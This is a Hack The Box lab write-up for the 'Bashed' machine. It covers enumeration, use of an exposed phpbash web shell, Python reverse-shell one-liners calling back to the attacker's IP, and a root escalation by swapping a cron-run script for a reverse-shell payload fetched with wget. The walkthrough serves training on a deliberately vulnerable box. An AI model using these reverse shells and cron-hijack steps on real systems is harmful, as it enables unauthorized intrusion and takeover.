# Bashed - HTB

Box - IP address

![](/images/bashed/1. bashed "Bashed Info Card")

Contents:

1. TOC
{:toc}

<p>&nbsp;</p>
=======================================================

## Introduction

=======================================================

Bashed is a Hack the Box example of system misconfiguration which allows a remote attacker to gain access and escalate to root privileges.

<p>&nbsp;</p>
=======================================================

## Tools & Techniques Used

=======================================================

The machine has an open web shell which allows us to spawn an interactive shell.  From the interactive shell we enumerate interesting files and discover another system misconfiguration which allows us to modify a python script which we call via sudo and obtain root privileges.

-1- nmap
-2- dirbuster
-3- php web shell
-4- bash reverse shell
-5- nc
-6- python scripting
-7- abuse system misconfiguration (sudo permissions)

<p>&nbsp;</p>
=======================================================

## Scanning and Enumeration

=======================================================

We start with a basic nmap scan to see what ports are open and services are available:

    nmap -A -T4 10.10.10.68

![](/images/bashed/2. nmap.png "nmap")

Port 80 is open running Apache 2.4.18, looks like on Ubuntu.

Let's visit the web site and see what we have! : http://10.10.10.68

![](/images/bashed/3. website.png "website")

So we have a blog entry telling us Arrexel developed “phpbash” on this server, and that phpbash is useful for pentesting!

No other real hints in the page source or links.

Let's fire up dirbuster and do some enumeration.

    dirbuster &

![](/images/bashed/4. dirbuster_1.png "dirbuster")

Since the site talks about “phpbash”, I went with File Extension php and the medium wordlist.

Click Start

You only need to let this run for a minute or so. I switch to the “Results - Tree View” tab:

![](/images/bashed/5. dirbuster_2.png "dirbuster")

Here you can click through different folders that Dirbuster has found.  Remember how the blog entry said Arrexel developed phpbash on this very server?  Click on the “dev” folder.  

![](/images/bashed/6. dirbuster_3.png "dirbuster")

Looks like we have a couple of the phpbash files to go look at!  Let's browse to it:  

    http://10.10.10.68/dev

![](/images/bashed/7. dev.png "dev")

Note, we have the webserver telling us it is Apache 2.4.18 Ubuntu just like our nmap results.

Click on phpbash.php

![](/images/bashed/8. phpbash.png "phpbash")

And we are greeted with what looks like a terminal window.  Could this be a bash shell via php?

    whoami

    pwd

    ls

![](/images/bashed/9. phpbash_2.png "phpbash")

Okay, so we have code execution as a low-privileged user, but this isn't the smoothest of interfaces. Perhaps we can use a bash one-liner to trigger a reverse tcp shell?  


<p>&nbsp;</p>
=======================================================

## Exploitation using Metasploit

=======================================================

None!  This box is an example of purely manual enumeration and exploitation.  Have fun!


<p>&nbsp;</p>
=======================================================

## Manual Exploitation

=======================================================


Let's Google bash one-line reverse shells:

![](/images/bashed/10. google.png "google")

This pentestmonkey site is a favorite: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

![](/images/bashed/11. pentestmonkey.png "pentestmonkey")

This python reverse shell is also a favorite, so on our Kali machine, let's set up a nc listener to catch the connection:

    nc -lvnp 17011

![](/images/bashed/12. nc_listener.png "nc listener")

Then in the phpbash window:

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.24",17011));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

A note here: Bashed is an older machine so it is fine to default to using python. In newer machines you will want to specify "python3" instead as python2 is deprecated. 

![](/images/bashed/13. nc_connection.png "nc connection")

Good to go, we have a shell! Let's check if we can sudo anything:

![](/images/bashed/14. sudo-l.png "sudo -l")

And we can! We can run pretty much anything as the user scriptmanager...which probably has more permissions than we do, so let's log ourselves in as scriptmanager:

    sudo -u scriptmanager bash -i

This command tells the system we want to run the command "bash -i", or bash in interactive mode, as the user scriptmanager. If it works it should give us a bash prompt as scriptmanager:

![](/images/bashed/15. sudo-u.png "sudo -u")

Looks good!  Let's see what else we can find in our home folder.

    cd /home/scriptmanager

    ls -la

![](/images/bashed/16. enum.png "enum")

Nothing interesting here.  Let's check the / directory:

    ls /

![](/images/bashed/17. enum_2.png "enum")

Okay, so we are a user scriptmanager, and in the / directory there is a “scripts” folder which isn't a normal thing on linux.  Let's check it out!

    cd scripts

    ls -la

![](/images/bashed/18. enum_3.png "enum")

test.py and test.txt.  test.txt has a date/timestamp of just a moment ago...hmm, what's in test.txt and test.py?

    cat test.txt

    cat test.py

![](/images/bashed/19. test.txt.png "test.txt")

The text “testing 123!” is in test.txt. The test.py file opens the test.txt and overwrites it...with “testing 123!”

But test.txt is owned by the root user, and again that timestamp was from right about the same time we ran the “ls -la” command.  Let's wait a minute and run ls -la again:

    ls -la

![](/images/bashed/20. enum_4.png "enum")

test.txt has a new timestamp...14:07, meaning there is a cron job or some scheduled task that is running test.py every minute or so. since user scriptmanager owns test.py, we can modify test.py and maybe gain a root shell!

On my Kali machine I created a new test.py file and put this code in it:

    import socket,subprocess,os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.14.24",17012))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/bash","-i"])

Then I ran python's HTTP server

    python -m SimpleHTTPServer 8080

Over on bashed I ran:
    
    wget http://10.10.14.24:8080/test.py

![](/images/bashed/21. wget.png "wget")

Next I set up a nc listener on Kali to catch the connection:

    nc -lvnp 17012

Next we need to replace the old test.py with my new test.py.1:

    mv test.py.1 test.py

![](/images/bashed/22. mv_test.py.1.png "mv test.py.1")

Now we wait a minute and in our Kali nc listener we should see:

![](/images/bashed/23. nc_listener_2.png "nc connection")

    whoami

![](/images/bashed/24. whoami.png "whoami")

Success! We are root.  Now let's get our flags:

    cat /home/arrexel/user.txt

    cat /root/root.txt

![](/images/bashed/25. flags.png "flags")

And there we have our flags.





<p>&nbsp;</p>
=======================================================

## Final Code

=======================================================

<file-name.py/.sh>

    insert code here
    # code blocks ignore the rest of markdown formatting
    # so you can leave # characters to denote comments
    # without setting new headings
        

<p>&nbsp;</p>
=======================================================

## Links & Additional Reading

=======================================================

1. Link: []()
2. Link: []()
3. Link: []()
4. Link: []()
5. Link: []()

<p>&nbsp;</p>
=======================================================

![rax logo](/images/rax_intel.png)

<p>&nbsp;</p>
